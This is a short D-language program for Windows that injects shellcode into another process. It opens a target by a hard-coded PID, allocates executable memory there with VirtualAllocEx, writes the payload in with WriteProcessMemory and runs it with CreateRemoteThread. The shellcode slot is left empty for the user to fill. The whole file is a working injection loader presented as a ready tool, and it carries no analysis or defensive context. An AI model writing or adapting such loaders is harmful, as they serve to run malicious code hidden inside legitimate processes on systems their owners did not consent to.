import core.sys.windows.windows;
import std.conv;

void main()
{
    // Define the shellcode as byte array 
    string payload = ""; // place shellcode here

    ubyte[] shellcode = cast(ubyte[])payload;
  
    // Get the handle of the target process
    auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, 4800); // 4800 is the PID, make sure to change this to the one you want to inject into.
    if (hProcess == null)
    {
        // Handle process opening failure
        return;
    }

    // Allocate memory in the target process
    LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, null, shellcode.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpRemoteBuffer == null)
    {
        // Handle memory allocation failure
        CloseHandle(hProcess);
        return;
    }

    // Write the shellcode to the allocated memory
    WriteProcessMemory(hProcess, lpRemoteBuffer, cast(LPCVOID)shellcode.ptr, shellcode.length, null);

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, null, 0, cast(LPTHREAD_START_ROUTINE)lpRemoteBuffer, null, 0, null);
    if (hThread == null)
    {
        // Handle thread creation failure
        VirtualFreeEx(hProcess, lpRemoteBuffer, shellcode.length, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up resources
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, lpRemoteBuffer, shellcode.length, MEM_RELEASE);
    CloseHandle(hProcess);
}
